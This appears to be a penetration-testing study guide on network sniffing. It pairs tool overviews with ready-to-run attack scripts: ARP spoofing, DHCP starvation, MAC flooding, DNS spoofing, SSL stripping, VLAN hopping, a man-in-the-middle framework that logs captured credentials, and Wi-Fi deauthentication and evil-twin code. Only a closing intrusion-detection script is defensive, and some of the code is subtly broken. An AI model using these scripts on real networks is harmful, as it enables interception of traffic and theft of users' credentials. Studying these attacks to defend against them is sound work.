# Network Sniffing - Topics Overview

## Topic Explanation
Network Sniffing is the practice of capturing and analyzing network traffic to extract sensitive information such as usernames, passwords, confidential data, and communication patterns. This technique involves monitoring data packets as they traverse network segments by placing network interfaces in promiscuous mode. Sniffing can be performed on various network topologies including switched and hub-based networks. The module covers different types of sniffing attacks including passive sniffing, active sniffing, MAC flooding, ARP poisoning, DHCP attacks, and various countermeasures to protect against these threats.

## Articles for Further Reference
- [NIST Special Publication 800-94: Guide to Intrusion Detection and Prevention Systems](https://csrc.nist.gov/publications/detail/sp/800-94/final)
- [IEEE 802.1X Network Access Control](https://standards.ieee.org/standard/802_1X-2020.html)
- [RFC 3164: The BSD Syslog Protocol](https://tools.ietf.org/html/rfc3164)
- [SANS Institute: Network Monitoring and Analysis](https://www.sans.org/white-papers/1534/)
- [Wireshark User's Guide](https://www.wireshark.org/docs/wsug_html_chunked/)

## Reference Links
- [Wireshark Official Documentation](https://www.wireshark.org/docs/)
- [tcpdump Manual Pages](https://www.tcpdump.org/manpages/)
- [Ettercap Project](https://www.ettercap-project.org/)
- [NetworkMiner Documentation](https://www.netresec.com/?page=NetworkMiner)
- [OWASP Testing for Network Infrastructure](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration)

## Available Tools for the Topic

### Tool Name: Wireshark
**Description:** Comprehensive network protocol analyzer that captures and displays packet data in real-time, supporting hundreds of protocols with powerful filtering and analysis capabilities.

**Example Usage:**
```bash
# Start packet capture on specific interface
wireshark -i eth0

# Capture to file
wireshark -i eth0 -w capture.pcap

# Command-line capture with tshark
tshark -i eth0 -f "tcp port 80" -w http_traffic.pcap

# Analyze captured file
tshark -r capture.pcap -Y "http.request.method == POST"

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,extracted_files/
```

**Reference Links:**
- [Wireshark Documentation](https://www.wireshark.org/docs/)
- [Wireshark Display Filters](https://wiki.wireshark.org/DisplayFilters)

### Tool Name: tcpdump
**Description:** Command-line packet analyzer that captures network traffic on Unix-like systems, providing powerful filtering options and output formats.

**Example Usage:**
```bash
# Basic packet capture
tcpdump -i eth0

# Capture HTTP traffic
tcpdump -i eth0 'tcp port 80'

# Capture and save to file
tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap

# Capture with ASCII output
tcpdump -i eth0 -A 'tcp port 80'

# Capture specific host traffic
tcpdump -i eth0 host 192.168.1.100
```

**Reference Links:**
- [tcpdump Manual](https://www.tcpdump.org/manpages/tcpdump.1.html)

### Tool Name: Ettercap
**Description:** Comprehensive suite for man-in-the-middle attacks on LAN networks, supporting ARP poisoning, DNS spoofing, and traffic interception.

**Example Usage:**
```bash
# ARP poisoning attack
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# DNS spoofing
echo "*.target-site.com A 192.168.1.50" >> /etc/ettercap/etter.dns
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.100//

# SSL stripping attack
ettercap -T -M arp:remote -P sslstrip /192.168.1.1// //

# GUI mode
ettercap -G
```

**Reference Links:**
- [Ettercap Official Documentation](https://www.ettercap-project.org/index.php)

### Tool Name: NetworkMiner
**Description:** Network forensics tool that extracts artifacts from network traffic captures, including files, images, messages, and credentials.

**Example Usage:**
```bash
# Start NetworkMiner (GUI application)
mono NetworkMiner.exe

# Command-line version
mono NetworkMinerCLI.exe -r capture.pcap -o output_directory

# Extract files from PCAP
mono NetworkMinerCLI.exe --pcap capture.pcap --output extracted_files/
```

**Reference Links:**
- [NetworkMiner User Guide](https://www.netresec.com/?page=NetworkMiner)

### Tool Name: Bettercap
**Description:** Modern network attack and monitoring framework with support for WiFi, Bluetooth, and network reconnaissance.

**Example Usage:**
```bash
# Start interactive session
sudo bettercap

# ARP spoofing
arp.spoof on
set arp.spoof.targets 192.168.1.100

# DNS spoofing
set dns.spoof.domains *.target-site.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# HTTP proxy with script injection
set http.proxy.script inject.js
http.proxy on

# WiFi reconnaissance
wifi.recon on
```

**Reference Links:**
- [Bettercap Documentation](https://www.bettercap.org/)

### Tool Name: Dsniff
**Description:** Collection of tools for network auditing and penetration testing including dsniff, urlsnarf, filesnarf, and mailsnarf.

**Example Usage:**
```bash
# Password sniffing
dsniff -i eth0

# URL monitoring
urlsnarf -i eth0

# File extraction
filesnarf -i eth0

# Email monitoring
mailsnarf -i eth0

# ARP spoofing with arpspoof
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

**Reference Links:**
- [Dsniff Documentation](https://www.monkey.org/~dugsong/dsniff/)

## All Possible Payloads for Manual Approach

### ARP Spoofing Payloads
```bash
# Manual ARP poisoning
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Custom ARP spoofing script
#!/bin/bash
TARGET_IP="192.168.1.100"
GATEWAY_IP="192.168.1.1"
INTERFACE="eth0"

echo "Starting ARP spoofing attack..."
arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP &
arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP &

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start packet capture
tcpdump -i $INTERFACE -w victim_traffic.pcap &
```

### DHCP Starvation Attack Payloads
```python
#!/usr/bin/env python3
from scapy.all import *
import random

def dhcp_starvation():
    interface = "eth0"
    
    for i in range(1000):
        # Generate random MAC address
        mac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
        
        # Create DHCP Discover packet
        discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(chaddr=mac.replace(":", "").decode('hex')) / \
                  DHCP(options=[("message-type", "discover"), "end"])
        
        sendp(discover, iface=interface, verbose=0)
        print(f"Sent DHCP Discover with MAC: {mac}")

if __name__ == "__main__":
    dhcp_starvation()
```

### MAC Flooding Attack Payloads
```python
#!/usr/bin/env python3
from scapy.all import *
import random

def mac_flooding_attack():
    interface = "eth0"
    target_ip = "192.168.1.100"
    
    print("Starting MAC flooding attack...")
    
    for i in range(10000):
        # Generate random MAC address
        random_mac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
        
        # Create Ethernet frame with random source MAC
        packet = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / \
                IP(src="192.168.1." + str(random.randint(1, 254)), dst=target_ip) / \
                ICMP()
        
        sendp(packet, iface=interface, verbose=0)
        
        if i % 1000 == 0:
            print(f"Sent {i} packets with random MAC addresses")

if __name__ == "__main__":
    mac_flooding_attack()
```

### DNS Spoofing Payloads
```python
#!/usr/bin/env python3
from scapy.all import *

def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        queried_host = packet[DNSQR].qname.decode('utf-8')
        
        # Spoof specific domains
        if "target-site.com" in queried_host:
            print(f"Spoofing DNS response for {queried_host}")
            
            # Create spoofed response
            spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                             UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                             DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                 an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata="192.168.1.50"))
            
            send(spoofed_response, verbose=0)

# Sniff DNS queries and respond with spoofed answers
sniff(filter="udp port 53", prn=dns_spoof, iface="eth0")
```

### SSL Stripping Attack Payloads
```python
#!/usr/bin/env python3
import mitmproxy
from mitmproxy import http

class SSLStripAddon:
    def response(self, flow: http.HTTPFlow) -> None:
        # Replace HTTPS links with HTTP
        if flow.response.content:
            content = flow.response.content.decode('utf-8', errors='ignore')
            content = content.replace('https://', 'http://')
            content = content.replace('action="https://', 'action="http://')
            flow.response.content = content.encode('utf-8')

addons = [SSLStripAddon()]

# Start mitmproxy with SSL stripping
# mitmproxy -s sslstrip.py --mode transparent
```

### VLAN Hopping Payloads
```python
#!/usr/bin/env python3
from scapy.all import *

def vlan_hopping_attack():
    # Double tagging attack
    interface = "eth0"
    target_vlan = 100
    native_vlan = 1
    
    # Create double-tagged frame
    packet = Ether() / \
             Dot1Q(vlan=native_vlan) / \
             Dot1Q(vlan=target_vlan) / \
             IP(dst="192.168.100.1") / \
             ICMP()
    
    sendp(packet, iface=interface, verbose=1)
    print(f"Sent VLAN hopping packet to VLAN {target_vlan}")

if __name__ == "__main__":
    vlan_hopping_attack()
```

## Example Payloads

### 1. Comprehensive Network Reconnaissance and Sniffing
```bash
#!/bin/bash
# Network sniffing and analysis script

INTERFACE="eth0"
CAPTURE_FILE="network_capture.pcap"
DURATION="300"  # 5 minutes

echo "Starting comprehensive network sniffing..."

# Start packet capture
tcpdump -i $INTERFACE -w $CAPTURE_FILE &
TCPDUMP_PID=$!

echo "Packet capture started (PID: $TCPDUMP_PID)"
echo "Capturing for $DURATION seconds..."

# Perform ARP scanning while capturing
nmap -sn 192.168.1.0/24 > /dev/null 2>&1 &

# Wait for capture duration
sleep $DURATION

# Stop packet capture
kill $TCPDUMP_PID
echo "Packet capture stopped"

# Analyze captured traffic
echo "Analyzing captured traffic..."

# Extract HTTP credentials
tshark -r $CAPTURE_FILE -Y "http.request.method == POST" -T fields -e http.request.uri -e http.file_data > http_posts.txt

# Extract FTP credentials
tshark -r $CAPTURE_FILE -Y "ftp.request.command == USER or ftp.request.command == PASS" -T fields -e ftp.request.arg > ftp_creds.txt

# Extract SMTP traffic
tshark -r $CAPTURE_FILE -Y "smtp" -T fields -e smtp.req.parameter > smtp_data.txt

# Extract DNS queries
tshark -r $CAPTURE_FILE -Y "dns.flags.response == 0" -T fields -e dns.qry.name > dns_queries.txt

# Generate traffic statistics
tshark -r $CAPTURE_FILE -q -z conv,ip > traffic_stats.txt

echo "Analysis complete. Check output files for results."
```

### 2. Advanced Man-in-the-Middle Attack Framework
```python
#!/usr/bin/env python3
from scapy.all import *
import threading
import time
import subprocess

class MITMAttack:
    def __init__(self, interface, gateway_ip, target_ip):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.gateway_mac = None
        self.target_mac = None
        self.running = False
    
    def get_mac(self, ip):
        """Get MAC address for given IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding"""
        subprocess.run(["echo", "1"], stdout=open("/proc/sys/net/ipv4/ip_forward", "w"))
    
    def restore_tables(self):
        """Restore ARP tables to original state"""
        if self.gateway_mac and self.target_mac:
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac), verbose=False)
            send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=False)
    
    def arp_spoof(self):
        """Perform ARP spoofing"""
        while self.running:
            # Spoof target (tell target that we are the gateway)
            send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip), verbose=False)
            
            # Spoof gateway (tell gateway that we are the target)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip), verbose=False)
            
            time.sleep(2)
    
    def packet_handler(self, packet):
        """Handle intercepted packets"""
        if packet.haslayer(HTTPRequest):
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            print(f"[HTTP] {packet[IP].src} -> {url}")
            
            # Log credentials if POST request
            if packet[HTTPRequest].Method.decode() == "POST":
                if packet.haslayer(Raw):
                    data = packet[Raw].load.decode(errors='ignore')
                    if any(keyword in data.lower() for keyword in ['username', 'password', 'login', 'email']):
                        print(f"[CREDENTIALS] {data}")
        
        elif packet.haslayer(DNSQR):
            print(f"[DNS] {packet[IP].src} -> {packet[DNSQR].qname.decode()}")
    
    def start_attack(self):
        """Start the MITM attack"""
        print(f"Starting MITM attack on {self.target_ip}")
        
        # Get MAC addresses
        self.gateway_mac = self.get_mac(self.gateway_ip)
        self.target_mac = self.get_mac(self.target_ip)
        
        if not self.gateway_mac or not self.target_mac:
            print("Failed to get MAC addresses")
            return
        
        print(f"Gateway MAC: {self.gateway_mac}")
        print(f"Target MAC: {self.target_mac}")
        
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        # Start ARP spoofing in background thread
        self.running = True
        arp_thread = threading.Thread(target=self.arp_spoof)
        arp_thread.start()
        
        # Start packet sniffing
        try:
            sniff(iface=self.interface, prn=self.packet_handler, store=0)
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.running = False
            self.restore_tables()
            print("ARP tables restored")

# Example usage
if __name__ == "__main__":
    interface = "eth0"
    gateway_ip = "192.168.1.1"
    target_ip = "192.168.1.100"
    
    mitm = MITMAttack(interface, gateway_ip, target_ip)
    mitm.start_attack()
```

### 3. Wireless Network Sniffing and Attack
```python
#!/usr/bin/env python3
from scapy.all import *
import subprocess
import time

class WiFiAttack:
    def __init__(self, interface):
        self.interface = interface
        self.monitor_interface = interface + "mon"
        self.networks = {}
        self.clients = {}
    
    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        subprocess.run(["airmon-ng", "start", self.interface])
    
    def disable_monitor_mode(self):
        """Disable monitor mode"""
        subprocess.run(["airmon-ng", "stop", self.monitor_interface])
    
    def beacon_handler(self, packet):
        """Handle beacon frames to discover networks"""
        if packet.haslayer(Dot11Beacon):
            bssid = packet[Dot11].addr2
            ssid = packet[Dot11Elt].info.decode(errors='ignore')
            
            if bssid not in self.networks:
                channel = int(ord(packet[Dot11Elt:3].info))
                encryption = self.get_encryption_type(packet)
                
                self.networks[bssid] = {
                    'ssid': ssid,
                    'channel': channel,
                    'encryption': encryption
                }
                
                print(f"[NETWORK] SSID: {ssid}, BSSID: {bssid}, Channel: {channel}, Encryption: {encryption}")
    
    def probe_handler(self, packet):
        """Handle probe requests to identify clients"""
        if packet.haslayer(Dot11ProbeReq):
            client_mac = packet[Dot11].addr2
            if packet[Dot11Elt]:
                ssid = packet[Dot11Elt].info.decode(errors='ignore')
                
                if client_mac not in self.clients:
                    self.clients[client_mac] = []
                
                if ssid not in self.clients[client_mac]:
                    self.clients[client_mac].append(ssid)
                    print(f"[CLIENT] {client_mac} probing for '{ssid}'")
    
    def get_encryption_type(self, packet):
        """Determine encryption type from beacon frame"""
        cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
        
        if "privacy" in cap:
            if packet.haslayer(Dot11EltRSN):
                return "WPA2"
            elif packet.haslayer(Dot11EltVendorSpecific):
                return "WPA"
            else:
                return "WEP"
        else:
            return "Open"
    
    def deauth_attack(self, target_bssid, client_mac=None):
        """Perform deauthentication attack"""
        if client_mac:
            # Target specific client
            deauth = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
            print(f"Deauthenticating client {client_mac} from {target_bssid}")
        else:
            # Broadcast deauth
            deauth = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
            print(f"Broadcasting deauth for network {target_bssid}")
        
        # Send deauth packets
        for _ in range(50):
            sendp(deauth, iface=self.monitor_interface, verbose=0)
            time.sleep(0.1)
    
    def evil_twin_attack(self, target_ssid, channel):
        """Create evil twin access point"""
        print(f"Creating evil twin for '{target_ssid}' on channel {channel}")
        
        # Configure hostapd
        hostapd_conf = f"""
        interface={self.interface}
        driver=nl80211
        ssid={target_ssid}
        hw_mode=g
        channel={channel}
        macaddr_acl=0
        auth_algs=1
        ignore_broadcast_ssid=0
        wpa=2
        wpa_passphrase=password123
        wpa_key_mgmt=WPA-PSK
        wpa_pairwise=TKIP
        rsn_pairwise=CCMP
        """
        
        with open("/tmp/hostapd.conf", "w") as f:
            f.write(hostapd_conf)
        
        # Start evil twin
        subprocess.Popen(["hostapd", "/tmp/hostapd.conf"])
    
    def start_monitoring(self):
        """Start WiFi monitoring"""
        print("Starting WiFi monitoring...")
        self.enable_monitor_mode()
        
        try:
            sniff(iface=self.monitor_interface, 
                  prn=lambda x: self.beacon_handler(x) or self.probe_handler(x))
        except KeyboardInterrupt:
            print("\nStopping monitoring...")
        finally:
            self.disable_monitor_mode()

# Example usage
if __name__ == "__main__":
    wifi_attack = WiFiAttack("wlan0")
    wifi_attack.start_monitoring()
```

### 4. Protocol-Specific Traffic Analysis
```python
#!/usr/bin/env python3
from scapy.all import *
import re
import base64

class ProtocolAnalyzer:
    def __init__(self, pcap_file):
        self.pcap_file = pcap_file
        self.credentials = []
        self.files = []
        self.emails = []
    
    def analyze_http(self, packet):
        """Analyze HTTP traffic for credentials and sensitive data"""
        if packet.haslayer(HTTPRequest):
            method = packet[HTTPRequest].Method.decode()
            host = packet[HTTPRequest].Host.decode()
            path = packet[HTTPRequest].Path.decode()
            
            if method == "POST" and packet.haslayer(Raw):
                data = packet[Raw].load.decode(errors='ignore')
                
                # Extract form data
                form_data = {}
                for pair in data.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        form_data[key] = value
                
                # Look for credentials
                credential_keywords = ['username', 'password', 'login', 'email', 'user', 'pass']
                for key, value in form_data.items():
                    if any(keyword in key.lower() for keyword in credential_keywords):
                        self.credentials.append({
                            'protocol': 'HTTP',
                            'host': host,
                            'path': path,
                            'field': key,
                            'value': value,
                            'timestamp': packet.time
                        })
    
    def analyze_ftp(self, packet):
        """Analyze FTP traffic for credentials"""
        if packet.haslayer(Raw):
            data = packet[Raw].load.decode(errors='ignore')
            
            if data.startswith('USER '):
                username = data[5:].strip()
                self.credentials.append({
                    'protocol': 'FTP',
                    'server': packet[IP].dst,
                    'username': username,
                    'timestamp': packet.time
                })
            
            elif data.startswith('PASS '):
                password = data[5:].strip()
                self.credentials.append({
                    'protocol': 'FTP',
                    'server': packet[IP].dst,
                    'password': password,
                    'timestamp': packet.time
                })
    
    def analyze_smtp(self, packet):
        """Analyze SMTP traffic for email content"""
        if packet.haslayer(Raw):
            data = packet[Raw].load.decode(errors='ignore')
            
            # Look for email headers
            if 'From:' in data or 'To:' in data or 'Subject:' in data:
                self.emails.append({
                    'server': packet[IP].dst,
                    'data': data,
                    'timestamp': packet.time
                })
            
            # Look for AUTH LOGIN
            if 'AUTH LOGIN' in data:
                auth_data = data.split('AUTH LOGIN ')[1].strip()
                try:
                    decoded = base64.b64decode(auth_data).decode()
                    self.credentials.append({
                        'protocol': 'SMTP',
                        'server': packet[IP].dst,
                        'auth_data': decoded,
                        'timestamp': packet.time
                    })
                except:
                    pass
    
    def analyze_telnet(self, packet):
        """Analyze Telnet traffic for credentials"""
        if packet.haslayer(Raw):
            data = packet[Raw].load.decode(errors='ignore')
            
            # Telnet login patterns
            if 'login:' in data.lower() or 'username:' in data.lower():
                self.credentials.append({
                    'protocol': 'Telnet',
                    'server': packet[IP].dst,
                    'prompt': data.strip(),
                    'timestamp': packet.time
                })
    
    def extract_files(self, packet):
        """Extract files from HTTP traffic"""
        if packet.haslayer(HTTPResponse) and packet.haslayer(Raw):
            if 'Content-Disposition' in str(packet[HTTPResponse]):
                content_disp = packet[HTTPResponse].get_field('Content-Disposition')
                if 'filename=' in content_disp:
                    filename = re.search(r'filename="([^"]+)"', content_disp)
                    if filename:
                        self.files.append({
                            'filename': filename.group(1),
                            'data': packet[Raw].load,
                            'size': len(packet[Raw].load),
                            'timestamp': packet.time
                        })
    
    def analyze_traffic(self):
        """Analyze all traffic in the PCAP file"""
        print(f"Analyzing {self.pcap_file}...")
        
        packets = rdpcap(self.pcap_file)
        
        for packet in packets:
            if packet.haslayer(TCP):
                # HTTP analysis
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    self.analyze_http(packet)
                    self.extract_files(packet)
                
                # FTP analysis
                elif packet[TCP].dport == 21 or packet[TCP].sport == 21:
                    self.analyze_ftp(packet)
                
                # SMTP analysis
                elif packet[TCP].dport == 25 or packet[TCP].sport == 25:
                    self.analyze_smtp(packet)
                
                # Telnet analysis
                elif packet[TCP].dport == 23 or packet[TCP].sport == 23:
                    self.analyze_telnet(packet)
    
    def generate_report(self):
        """Generate analysis report"""
        print("\n=== TRAFFIC ANALYSIS REPORT ===")
        
        print(f"\nCredentials Found: {len(self.credentials)}")
        for cred in self.credentials:
            print(f"  Protocol: {cred['protocol']}")
            for key, value in cred.items():
                if key != 'protocol':
                    print(f"    {key}: {value}")
            print()
        
        print(f"\nFiles Extracted: {len(self.files)}")
        for file_info in self.files:
            print(f"  Filename: {file_info['filename']}")
            print(f"  Size: {file_info['size']} bytes")
            print(f"  Timestamp: {file_info['timestamp']}")
            print()
        
        print(f"\nEmails Captured: {len(self.emails)}")
        for email in self.emails:
            print(f"  Server: {email['server']}")
            print(f"  Content: {email['data'][:100]}...")
            print()

# Example usage
if __name__ == "__main__":
    analyzer = ProtocolAnalyzer("network_capture.pcap")
    analyzer.analyze_traffic()
    analyzer.generate_report()
```

### 5. Real-time Network Intrusion Detection
```python
#!/usr/bin/env python3
from scapy.all import *
import collections
import time
import threading

class NetworkIDS:
    def __init__(self, interface):
        self.interface = interface
        self.connection_tracker = collections.defaultdict(int)
        self.scan_detector = collections.defaultdict(lambda: collections.defaultdict(int))
        self.alert_threshold = 10
        self.scan_threshold = 5
    
    def detect_port_scan(self, packet):
        """Detect port scanning activity"""
        if packet.haslayer(TCP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            dst_port = packet[TCP].dport
            
            # Track connection attempts
            self.scan_detector[src_ip][dst_ip] += 1
            
            # Check for scan pattern
            if len(self.scan_detector[src_ip]) > self.scan_threshold:
                print(f"[ALERT] Port scan detected from {src_ip}")
                print(f"  Targets: {list(self.scan_detector[src_ip].keys())}")
    
    def detect_dos_attack(self, packet):
        """Detect potential DoS attacks"""
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            self.connection_tracker[src_ip] += 1
            
            # Check connection rate
            if self.connection_tracker[src_ip] > self.alert_threshold:
                print(f"[ALERT] Potential DoS attack from {src_ip}")
                print(f"  Connection count: {self.connection_tracker[src_ip]}")
    
    def detect_arp_spoofing(self, packet):
        """Detect ARP spoofing attacks"""
        if packet.haslayer(ARP):
            if packet[ARP].op == 2:  # ARP reply
                src_mac = packet[ARP].hwsrc
                src_ip = packet[ARP].psrc
                
                # Check for duplicate IP with different MAC
                if hasattr(self, 'arp_table'):
                    if src_ip in self.arp_table and self.arp_table[src_ip] != src_mac:
                        print(f"[ALERT] ARP spoofing detected!")
                        print(f"  IP: {src_ip}")
                        print(f"  Original MAC: {self.arp_table[src_ip]}")
                        print(f"  New MAC: {src_mac}")
                else:
                    self.arp_table = {}
                
                self.arp_table[src_ip] = src_mac
    
    def detect_suspicious_dns(self, packet):
        """Detect suspicious DNS activity"""
        if packet.haslayer(DNSQR):
            query = packet[DNSQR].qname.decode()
            
            # Check for suspicious domains
            suspicious_patterns = [
                '.tk', '.ml', '.cf',  # Free TLDs often used by attackers
                'bit.ly', 'tinyurl',  # URL shorteners
                'dyndns', 'no-ip'     # Dynamic DNS services
            ]
            
            for pattern in suspicious_patterns:
                if pattern in query.lower():
                    print(f"[ALERT] Suspicious DNS query: {query}")
                    print(f"  From: {packet[IP].src}")
                    break
    
    def packet_handler(self, packet):
        """Main packet handler"""
        try:
            self.detect_port_scan(packet)
            self.detect_dos_attack(packet)
            self.detect_arp_spoofing(packet)
            self.detect_suspicious_dns(packet)
        except Exception as e:
            pass  # Ignore packet parsing errors
    
    def cleanup_counters(self):
        """Periodically cleanup tracking counters"""
        while True:
            time.sleep(60)  # Clean every minute
            self.connection_tracker.clear()
            # Keep scan detector for longer to track persistent scans
            if len(self.scan_detector) > 100:
                # Remove oldest entries
                oldest_ips = list(self.scan_detector.keys())[:50]
                for ip in oldest_ips:
                    del self.scan_detector[ip]
    
    def start_monitoring(self):
        """Start network monitoring"""
        print(f"Starting network IDS on interface {self.interface}")
        
        # Start cleanup thread
        cleanup_thread = threading.Thread(target=self.cleanup_counters, daemon=True)
        cleanup_thread.start()
        
        # Start packet sniffing
        try:
            sniff(iface=self.interface, prn=self.packet_handler, store=0)
        except KeyboardInterrupt:
            print("\nStopping network monitoring...")

# Example usage
if __name__ == "__main__":
    ids = NetworkIDS("eth0")
    ids.start_monitoring()
```